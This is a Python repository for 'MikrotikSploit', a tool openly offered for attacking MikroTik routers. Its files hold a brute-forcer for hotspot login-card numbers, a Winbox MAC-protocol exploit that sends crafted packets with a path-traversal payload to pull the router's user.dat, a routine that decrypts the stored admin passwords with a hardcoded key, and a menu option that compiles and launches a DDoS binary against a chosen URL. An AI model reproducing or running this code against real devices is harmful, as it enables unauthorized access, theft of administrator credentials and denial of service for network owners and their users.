# Repository Information
Name: MikrotikSploit

# Files

File: config
================================================
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://gitlab.com/aliqateebah2/MikrotikSploit.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
================================================

File: description
================================================
Unnamed repository; edit this file 'description' to name the repository.
================================================

File: pythonapp.yml
================================================
name: Python application
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v1
    - name: Set up Python 3.7
      uses: actions/setup-python@v1
      with:
        python-version: 3.7
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
    - name: Lint with flake8
      run: |
        pip install flake8
        # stop the build if there are Python syntax errors or undefined names
        flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide
        flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
    - name: Test with pytest
      run: |
        pip install pytest
        pytest
================================================

File: ex818m.py
================================================
#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** (EX-818-M) Exploit 818 Mikrotik ***
# * Version:
#   v1.1
# * Date:
#   19 - 08 - 2019 { Mon 19 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************
import os
import sys
import time
from re import split as SP
from random import randint
sys.path.append('../modules/')
from tools import agent as _USER_AGENT
from color import *
try:
    import requests
except ImportError:
    print("[!] Error import 'requests' model")
    exit()
def write(M, T):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(T / 100)
def cou(word) -> int():
    n = 0
    for i in word:n += 1
    return n
def _PRINT(*args, **kwargs):
    _MSG = args[0].strip()
    return print(args[0])
def URL_CLEAR(*args, **kwargs):
    _RE_ = args[0]
    _RE_ = _RE_.replace("http://","") if 'http' in _RE_ else _RE_
    _RE_ = _RE_.rsplit("/")[0] if "/" in args[0] else _RE_
    return _RE_
def _WRITE_PASSWORD(*args, **kwargs):
    _FILE_ = open(os.path.join(os.getcwd(),'Password.txt'), 'a')  
    _FILE_.write(f"\n{'+'*5} Mr.MHM {'+'*5}\nPASSWORD: {args[0]}\n")
    _FILE_.close()
def _INDEX(*args, **kwargs):
    os.system("clear")
    _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in {os.getcwd()}/Password.txt ^^\n") if int(args[3]) > 0 else ""
    _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
[{B} * {N}] SIZE     : {args[1].headers['Content-Length']} Bytes
[{B} * {N}] URL      : {URL_CLEAR(args[1].url)}
[{B} * {N}] PASSWORD : {args[2]}
[{B} * {N}] TIMEOUT  : {args[1].elapsed.total_seconds()}\n\n\n--- Enter Ctrl+C for (exit) ---""")
    return _PRINT(_P)
def _REQUESTS_SU(*args, **kwargs):
    global _S
    HOST, PASSWIRD = args
    _S = requests.Session()
    _S.headers['User-Agent'] = _USER_AGENT(randint(0,10))
    _DATA = {"username": str(PASSWIRD)}
    try:
        _GET = _S.post(url=f"http://{HOST}/login", data=_DATA)
    except:
        _PRINT(f"[{R} - {N}] Sorry ERROR For Connection !!")
        sys.exit(0)
    return _GET
def _PROCESS_DATA(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args
    ZERO = True if MINNUM.startswith("0") is False else False
    _A = PROCESS_SIZE = FIND = int()
    _R = True
    for PASSWIRD in range(int(MINNUM),int(MAXNUM)):
        PASSWIRD = PASSWIRD if ZERO is True else f"0{PASSWIRD}"
        DATA = _REQUESTS_SU(HOST,PASSWIRD)
        if _R is True:
            PROCESS_SIZE = int(DATA.headers['Content-Length'])
            _R = False
        if int(DATA.headers['Content-Length']) < PROCESS_SIZE and int(DATA.status_code) == 200:
            if  PROCESS_SIZE - int(DATA.headers['Content-Length']) > 3000:
                    _S.get(url=f"http://{HOST}/logout")
                    _S.delete(url=f"http://{HOST}/login")                    
                    _WRITE_PASSWORD(PASSWIRD)
                    _R = True
                    FIND += 1
        _INDEX(_A, DATA, PASSWIRD, FIND)
        _A += 1
def _SERVER_SYS(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args
    _PROCESS_DATA(URL_CLEAR(HOST), MINNUM, MAXNUM)
class MAIN(object):
    def __init__(self):
        pass
    def run(self, HOST, MINNUM,MAXNUM):
        _SERVER_SYS(HOST, MINNUM, MAXNUM)
================================================

File: __init__.py
================================================
"""The MikrotikSploit commonfiles."""
================================================

File: find.py
================================================
import socket, binascii, threading, time,sys
sys.path.append('../modules/')
from color import *
# MAC server discovery by BigNerd95
class MAC:
    def __init__(self):
        self.search = True
        self.devices = []
    def discovery(self,sock):
        try:
            while self.search:
                sock.sendto(b"\x00\x00\x00\x00", ("255.255.255.255", 5678))
        except:
           print(f"{W}[{R} - {W}]{B} No {R}CONNECT{N} {B}For Your Router{N} \n\n\n{WOW}"
                 f"----- Enter Ctrl+C for (Exit) -----{N}")
    def soRun(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind(("0.0.0.0", 5678))
        threading.Thread(target=self.discovery, args=(sock,)).start()
        while self.search:
            try:
                data, addr = sock.recvfrom(1024)
                if b"\x00\x01\x00\x06" in data:
                    start = data.index(b"\x00\x01\x00\x06") + 4
                    mac = data[start:start + 6]
                    if mac not in self.devices:
                        self.search = False
                        self.devices.append(mac)
                        addr = addr[0]
                        mac = '' + ':'.join('%02x' % b for b in mac)
                        return [addr, mac]
            except KeyboardInterrupt:
                self.search = False
                break
================================================

File: run.py
================================================
import threading, socket, struct, time,  binascii,sys
from user import dump
sys.path.append('../modules/')
from tools import EX_BIN
# MAC server Winbox exploit by BigNerd95 (and mosajjal)
class MikrotikMACClient():
    START = 0
    DATA = 1
    ACK = 2
    END = 255
    PROTO_VERSION = 1
    CLIENT_TYPE = 0x0F90
    SESSION_ID = 0x1234
    ADDR = ("255.255.255.255", 20561)
    HEADLEN = 22
    VERBOSE = False
    def __init__(self, mac):
        self.session_bytes_sent = 0
        self.session_bytes_recv = 0
        self.source_mac = b"\xff\xff\xff\xff\xff\xff"  # put mac of your pc if mikrotik is not responding
        self.dest_mac = mac
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.buffer = []
        self.work = True
        self.connected = False
        self.rm = threading.Thread(target=self.__recv_manager__)
        self.rm.start()
        self.__send_init__()
    def __recv_manager__(self):
        while self.work:
            data, _ = self.sock.recvfrom(1024 * 64)
            self.__parse_packet__(data)
    def __buffer_pop__(self):
        while not self.buffer and self.connected:
            time.sleep(0.005)
        return self.buffer.pop(0)
    def __parse_packet__(self, data):
        _, packet_type = struct.unpack(">BB", data[:2])
        session_id, _, session_bytes = struct.unpack(">HHI", data[14:self.HEADLEN])
        if packet_type == self.DATA:
            self.__print__("New DATA")
            self.session_bytes_recv += len(data) - self.HEADLEN
            self.__send_ack__()
            self.buffer.append(data[self.HEADLEN:])
            self.connected = True
        elif packet_type == self.ACK:
            self.__print__("New ACK")
            self.connected = True
            self.session_bytes_sent = session_bytes
        elif packet_type == self.END:
            self.__print__("End session")
            self.connected = False
            self.work = False
            self.__send_ack__()
        else:
            self.__print__("Unknown packet")
            self.__print__(data)
        self.__print__("ID:", session_id, "Bytes:", session_bytes)
        if len(data) > self.HEADLEN:
            self.__print__("Data:", data[self.HEADLEN:])
        self.__print__()
    def __send_ack__(self):
        self.sock.sendto(self.__build_packet__(self.ACK), self.ADDR)
    def __send_data__(self, data):
        self.sock.sendto(self.__build_packet__(self.DATA, data), self.ADDR)
    def __send_end__(self):
        self.sock.sendto(self.__build_packet__(self.END), self.ADDR)
    def __send_init__(self):
        self.sock.sendto(self.__build_packet__(self.START), self.ADDR)
        while not self.connected:
            time.sleep(0.005)
    def __build_packet__(self, packet_type, data=b""):
        header = struct.pack(">BB",
                             self.PROTO_VERSION,
                             packet_type
                             )
        header += self.source_mac
        header += self.dest_mac
        header += struct.pack(">HHI",
                              self.SESSION_ID,
                              self.CLIENT_TYPE,
                              self.session_bytes_sent if packet_type == self.DATA else self.session_bytes_recv
                              )
        return header + data
    def __print__(self, *msg):
        if self.VERBOSE:
            print(*msg)
    def send(self, data):
        self.__send_data__(data)
    def recv(self, minlen=None, contains=None):
        d = self.__buffer_pop__()
        while (minlen and len(d) < minlen) or (contains and contains not in d):
            d = self.__buffer_pop__()
        return d
    def close(self):
        self.work = False
        self.__send_end__()
class RUN:
    def __init__(self):
        self.D = None
        self._BIN_ = EX_BIN().BIN()
    def soRun2(self, mac):
        mac = binascii.unhexlify(mac.replace(':', ''))
        m = MikrotikMACClient(mac)
        m.send(self._BIN_[0])
        self._BIN_[1][19] = m.recv(minlen=39)[38]  # set correct session id
        m.send(self._BIN_[1])
        self.D = dump(m.recv(contains=b"\x11\x00\x00\x21"))
        m.close()
        return self.D
================================================

File: user.py
================================================
#!/usr/bin/env python3
import sys, hashlib
def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()
    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
    return passw.split("\x00")[0]
def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]
    user_len = user_data[0]
    pass_len = pass_data[0]
    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]
    return username, password
def get_pair(data):
    user_list = []
    entries = data.split(b"M2")[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue
        pass_plain = decrypt_password(user, pass_encrypted)
        user = user.decode("ascii")
        user_list.append((user, pass_plain))
    return user_list
def dump(data):
    user_pass = get_pair(data)
    for u, p in user_pass:
        print("User:", u)
        print("Pass:", p)
        print()
if __name__ == "__main__":
    if len(sys.argv) == 2:
        if sys.argv[1] == "-":
            user_file = sys.stdin.buffer.read()
        else:
            user_file = open(sys.argv[1], "rb").read()
        dump(user_file)
    else:
        print("Usage:")
        print("\tFrom file: \t", sys.argv[0], "user.dat")
        print("\tFrom stdin:\t", sys.argv[0], "-")
================================================

File: __init__.py
================================================
"""The MikrotikSploit commonfiles."""
================================================

File: __init__.py
================================================
"""The MikrotikSploit commonfiles."""
================================================

File: MikrotikSploit.py
================================================
#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************
import sys,os
sys.path.append('./modules/')
from home import RunScript
class MIK(object):
    def __init__(self):
        pass
    def HOME(self):
        script, *values = sys.argv
        RunScript().run2() \
        if values == [] \
        else RunScript().run3()
if __name__ == '__main__':
    try:
        _FIND_ = os.listdir("..")
        if "logs" not in _FIND_: os.system("mkdir logs")
    except OSError:
        print(f"{W}[{R} - {W}]{B} Error mkdir logs ")
        exit()
    MIK().HOME()
================================================

File: color.py
================================================
#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************
'''
Module Of Colors.
OS : Ubuntu
'''
# banner Colors
bannerblue = '\033[34m'
bannerblue2 = '\033[1;1;94m'
yellowhead = '\033[1;1;94m'
# default colors
R = '\033[31m'
P = '\033[34m'
W = '\033[37m'
B = '\033[36m'
WOW = '\033[7m'
F = '\033[5m'
F2 = '\033[4m'
N = '\033[0m'
T = '\033[93m'
Y = '\033[33m'
# test colors
failexploit = '\033[91mFAIL\033[0m'
vulnexploit = '\033[92mVULN\033[0m'
portopen = '\033[92mOPEN \033[0m'
portclose = '\033[91mCLOSE\033[0m'
================================================

File: home.py
================================================
#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************
import sys
from loop import LOOP, CLEAR
from color import *
sys.path.append('../core/ex818m/')
from ex818m import write
s = "\033[1m"
class RunScript(object):
    def __init__(self):
        self.YE =""
        self.HELP =""
    def run1(self):
        self.YE = write(f"""
            {B}4D 69 6B 72 6F 74 69 {N}
    {R}.  . .         ,  .   __.   .     , 
    {W}|\/|*;_/._. _ -+-*;_/(__ ._ | _ *-+-
    \033[30m|  ||| \[  (_) | || \.__)[_)|(_)| | 
                             |          {N}
            {B}6B 53 70 6C 6F 69 74 {N}
                        {F2}Version: 0.1{N}
    {T}@ Author => http://FB.com/mhm.hack
        """, 1)
        return self.YE
    def run2(self):
        CLEAR()
        self.run1()
        LOOP().LOOPS()
    def run3(self):
        CLEAR()
        self.HELP = f"""
            {B}4D 69 6B 72 6F 74 69 {N}
    {R}.  . .         ,  .   __.   .     ,
    {W}|\/|*;_/._. _ -+-*;_/(__ ._ | _ *-+-
    \033[30m|  ||| \[  (_) | || \.__)[_)|(_)| |
                             |          {N}
            {B}6B 53 70 6C 6F 69 74 {N}
                        {F2}Version: 0.1{N}
    {T}@ Author => http://FB.com/mhm.hack{N}
Use Script:
python3 {sys.argv[0]}
{W}-    -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -
{W}[{N} 1 {W}]{B} Getting Password    {W}|{B} Getting Password Cards Page Login My Network{N}
{W}[{N} 2 {W}]{B} Hack Mikrotik Panel {W}|{B} Exploit Mikrotik Admin Panel{N}
{W}[{N} 3 {W}]{B} DDoS Network        {W}|{B} DDoS attack for NetWork{N}
{W}[{N} 4 {W}]{B} About Us            {W}|{B} My Information {N}
{W}[{N} 5 {W}]{B} Update              {W}|{B} UPDATE The Tool{N}
{W}[{N} 6 {W}]{B} Exit                {W}|{B} Logout in This Script{N}"""
        return print(self.HELP)
================================================

File: loop.py
================================================
#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************
import re
import sys
import os
import time
import requests
import subprocess
from tools import asc, EX818M
from color import *
sys.path.append('core/ex818m/')
from ex818m import MAIN, write, cou
sys.path.append('core/ExploitPanelAdmin/')
from find import MAC
from run import RUN
def CLEAR():
    if sys.platform.startswith("win") is True:
        os.system("clr")
    else:
        os.system("clear")
def URL_CLEAR(url):
    _RE_ = re.split(r"ht[a-z]p\:\/\/|/", url)
    if "http" in url:url = _RE_[1]
    elif "/" in url:url = _RE_[0]
    else:url = url
    return url
def timeS():
    s = time.ctime().replace(' ', ':').split(':')[3:6]
    m = f"[{s[0]}:{s[1]}:{s[2]}]"
    return m
def Inf():
    print(""" 
Name        : Hathem Ahmed (MHM)
Facebook    : https://FB.COM/mhm.hack
Github      : https://github.com/HathemAhmed
Version     : v0.1
info script : this script for Hack Mikrotik Router """)
    input(f"{WOW}\n\n++++++ (Enter) ++++++{N}")
    CLEAR()
def writeEr(u,i,x):
    open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" Error Getting Password Cards Page Login My Network\n{timeS()} Error "
                                               f"Url={u} Min Number={i} Max Number={x}")
class LOOP:
    def __init__(self):
        self._NUM_ = int()
        self.find = True
        self.find1 = True
        self.find2 = True
        self._S_ = EX818M()
    def EX_818(self):
        CLEAR()
        print(self._S_[0])
        url = input(f"{W}[{P} * {W}]{B} Enter the URL Page Login{N}: ")
        minnum = input(f"{W}[{P} * {W}]{B} Enter the Min Number {N}: ")
        maxnum = input(f"{W}[{P} * {W}]{B} Enter the Max Number {N}: ")
        url = URL_CLEAR(url=url)
        try:
            MAIN().run(url,minnum,maxnum)
        except Exception as e:
            print(f"{W}[{R} - {W}]{B} Error For url OR numbers !!!\n{W}[{R} !!! {W}]{B} {e}")
            writeEr(url,minnum,maxnum)
        except requests.exceptions.ConnectionError as e:
            print(f"{W}[{R} - {W}]{B} Error For url !!!!\n{W}[{R} !!! {W}]{B} {e}")
    def ExploitBox(self):
        global adders, macks
        try:
            adders, macks = MAC().soRun()
        except:
            self.find = False
            open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" Error Exploit Mikrotik Admin Panel\n{timeS()} Error "
                                               f"IP=? MACK=?")
            sys.exit(2)
        if self.find is True:
            asc1 = input(f"{W}[{P} * {W}]{B} IP Address Your Router {adders} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
            if asc1 == "N":
                self.find1 = False
            else:
                adders = adders
        if self.find1 is False:
            if self.find is False:
                adders = input(f"{W}[{R} - {W}]{B} Enter Your IP Router{N}: ")
            else:
                adders = input(f"{W}[{R} - {W}]{B} Enter Your IP Router{N}: ")
            # End IP Address
        if self.find is True:
            asc2 = input(f"{W}[{P} * {W}]{B} MAC Address Your Router {macks} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
            if asc2 == "N":
                self.find2 = False
            else:
                macks = macks
        if self.find2 is False:
            if self.find is False:
                macks = input(f"{W}[{R} - {W}]{B} Enter Your MAC Router{N}: ")
            else:
                macks = input(f"{W}[{R} - {W}]{B} Enter Your MAC Router{N}: ")
            # End MAC Router
        try:
            write(f"\n\n{WOW}Exploiting .................{N}", 10)
            run = RUN().soRun2(macks)
            print(run)
        except TimeoutError:
            print(f"{W}[{R} - {W}]{B} Sorry Not Find Exploit For Your Router {N}")
    def DDos(self):
        CLEAR()
        print(self._S_[1])
        url = input(f"{W}[{P} * {W}]{B} Enter the URL For DoDs{N}: ")
        url = URL_CLEAR(url=url)
        write(f"{WOW} Please white .................{N}", 10)
        os.system("gcc -s ./core/DDoS/DDoS.c -o ./core/DDoS/DDoS")
        try:
            " %s " % os.system(f"./core/DDoS/DDoS {url} {80}")
        except OSError:
            open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                                               f" DDoS for Your NetWork\n{timeS()} Error "
                                               f"Url={url} Port={80}")
    def LOOPS(self):
        try:
            while True:
                self.find = True
                self.find1 = True
                self.find2 = True
                _ASC_ = asc()
                if _ASC_.strip() is "1":
                    self.EX_818()
                elif _ASC_.strip() is "2":
                    self.ExploitBox()
                elif _ASC_.strip() is "3":
                    self.DDos()
                elif _ASC_.strip() is "4":
                    Inf()
                elif _ASC_.strip() is "5":
                    ASCY = input("[ {R}!{N} ] Are you sure For Remove MikrotikSploit and UPDATE [Y/N]: ")
                    if ASCY.upper()[0] == "Y":
                        UB = os.system('cd ../&& rm -r MikrotikSploit && git clone https://github.com/hathemahmed/MikrotikSploit.git')
                        if UB != 0x00:
                            print("[{R}!{N}] Error For UPDATE")
                            exit()
                        else:
                            print("[ {B}+{N} ] Done UPDATE !")
                            exit()
                    else:pass
                elif _ASC_.strip() is "6":
                    exit()
        except KeyboardInterrupt:
            CLEAR()
            self.LOOPS()
================================================

File: tools.py
================================================
#!/usr/bin/python3
# coding=utf-8
# *******************************************************************
# *** MikrotikSploit ***
# * Version:
#   v0.1
# * Date:
#   28 - 08 - 2019 { Wed 28 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************
from color import *
def agent(NUM):
    agents = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) " +
        "Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0)" +
        " Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/56.0.2924.87 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; " +
        "Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS " +
        "X 10_12_2) AppleWebKit/602.3.12 (KHTML, " +
        "like Gecko) Version/10.0.2 Safari/602.3.12",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; " +
        "rv:51.0) Gecko/20100101 Firefox/51.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 " +
        "like Mac OS X) AppleWebKit/602.4.6 (KHTML, " +
        "like Gecko) Version/10.0 Mobile/14D27" +
        " Safari/602.1",
        "Mozilla/5.0 (Linux; Android 6.0.1; " +
        "Nexus 6P Build/MTC19X) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/56.0.2924.87 " +
        "Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 " +
        "Build/KTU84P) AppleWebKit/537.36 (KHTML, " +
        "like Gecko) Chrome/56.0.2924.87" +
        "Mobile Safari/537.36",
        "Mozilla/5.0 (compatible; Googlebot/2.1; " +
        "(http://www.google.com/bot.html)"
    ]
    return agents[int(NUM)]
def asc():
    ASCK = input(f"""
{W}[{N} 1 {W}]{B} Getting Password   
{W}[{N} 2 {W}]{B} Hack Mikrotik Panel 
{W}[{N} 3 {W}]{B} DDoS Network 
{W}[{N} 4 {W}]{B} About Us  
{W}[{N} 5 {W}]{B} Update
{W}[{N} 6 {W}]{B} Exit  
\n\n
{W}---------------------{N}
{B}{F2}Enter A Number{N}:""")
    return ASCK
def EX818M():
    S_ = """ 
Examples:
    |
    |
    |---> Enter the URL Page Login : http://a.net or 10.0.0.1
    |---> Enter the Min Number     : 72940000
    |---> Enter the MXn Number     : 72949999
    """
    S2_ = """
Examples:
    |
    |
    |---> Enter the URL For DDoS: http://a.net
    """
    return [S_, S2_]
class EX_BIN:
    def __init__(self):
        pass
    def BIN(self):
        bin1 = bytearray([0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
                          0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
                          0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
                          0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
                          0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
                          0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
                          0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
                          0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
                          0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
                          0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
                          0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
                          0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
                          0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
                          0x00, 0x00])
        bin2 = bytearray([0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                          0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                          0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
                          0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                          0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                          0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                          0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                          0x00, 0x02, 0x00, 0x00, 0x00])
        return [bin1, bin2]
================================================

File: __init__.py
================================================
"""The MikrotikSploit commonfiles."""
================================================

File: README.md
================================================
<h1 align="center">
  <br>
  <a href="https://github.com/0x802/MikrotikSploit"><img src="https://www.charbase.com/images/glyph/9763" alt="MikrotikSploit"></a>
  <br>
  MikrotikSploit
  <br>
</h1>
<h4 align="center">MikrotikSploit is a script that searches for and exploits Mikrotik network vulnerabilities</h4>
![Screenshot from 2019-06-19 05-22-04](https://raw.githubusercontent.com/0x802/MikrotikSploit/master/modules/images/b1.png)
**MikrotikSploit**  is a script that searches for and exploits Mikrotik network vulnerabilities Loophole pull numbers of network login cards ... 
Loophole know the username and password of the admin panel of the network Mikrotik ... A special section of the DoS system
-------------------------------------
### _☣ Features_
- Checks for vulnerabilities
- Integrated guess system on login cards
- Discover the name and password of the network management panel
- DDoS attack
- find the mistakes and resolve it
- Reporting: simple, Text.
-------------------------------------
### _☣ Available command line options_
[`READ MikrotikSploi WIKI`](https://github.com/0x802/MikrotikSploit/wiki)
    usage: MikrotikSploit [options]
     [ 1 ] Getting Password    | Getting Password Cards Page Login My Network
     [ 2 ] Hack Mikrotik Panel | Exploit Mikrotik Admin Panel
     [ 3 ] DoDs Network        | DoDs for Your NetWork
     [ 4 ] About Us            | My Information 
     [ 5 ] Exit                | Logout in This Script
-------------------------------------
### _☣ Docker_
MikrotikSploi in DOCKER !!.
```bash
$ git clone https://github.com/0x802/MikrotikSploit.git
$ cd MikrotikSploit
$ python3 -m pip install -r requirements.txt
$ python3 MikrotikSploit.py
```
-------------------------------------
### _☣ Install MikrotikSploit on Termux_
```BASH
$ pkg update
$ pkg install -y git
$ git clone https://github.com/0x802/MikrotikSploit.git
$ cd MikrotikSploit
$ python3 -m pip install -r requirements.txt
$ python3 MikrotikSploit.py
```
### _☣ Install MikrotikSploit in Windows_
- [click here](https://github.com/0x802/MikrotikSploit/archive/master.zip) to download MikrotikSploit
- download and install python3
- unzip **MikrotikSploit-master.zip** in ***c:/***
- open the command prompt **cmd**.
```
> cd c:/MikrotikSploit-master
> py -m pip install -r requirements.txt
> py MikrotikSploit.py
```
-------------------------------------
### _☣ Versions_
- v0.1
-------------------------------------
### :warning: Warning!
***I Am Not Responsible of any Illegal Use***
================================================

File: requirements.txt
================================================
colorama
requests
bs4